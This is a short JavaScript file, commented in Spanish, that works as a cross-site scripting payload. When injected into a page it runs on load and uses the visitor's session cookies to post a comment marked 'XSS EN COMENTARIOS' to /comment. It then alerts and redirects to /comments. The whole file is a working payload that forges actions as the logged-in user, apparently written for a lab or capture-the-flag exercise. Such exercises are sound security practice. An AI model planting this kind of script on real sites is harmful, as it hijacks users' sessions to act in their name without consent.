// comment-xss.js
window.addEventListener('load', function() {
    // Datos para el comentario
    const commentData = new URLSearchParams();
    commentData.append('content', '🚨 XSS EN COMENTARIOS - ' + new Date().toLocaleString());
    
    // Hacer la petición POST a /comment
    fetch('/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Origin': window.location.origin,
            'Referer': window.location.href,
            'Upgrade-Insecure-Requests': '1'
        },
        credentials: 'include',
        body: commentData
    })
    .then(response => {
        console.log('✅ Comentario enviado. Status:', response.status);
        
        if (response.ok) {
            console.log('🎉 Comentario publicado exitosamente');
            alert('✅ Comentario XSS publicado!');
            // Redirigir a comments para ver el resultado
            setTimeout(() => {
                window.location.href = '/comments';
            }, 1500);
        } else if (response.redirected) {
            console.log('🔒 Redirigiendo...');
            window.location.href = response.url;
        } else {
            console.log('❌ Error HTTP:', response.status);
            alert('❌ Error: ' + response.status);
        }
        return response.text();
    })
    .then(data => {
        console.log('📝 Respuesta del servidor recibida');
    })
    .catch(error => {
        console.log('💥 Error de red:', error);
        alert('💥 Error: ' + error.message);
    });
});
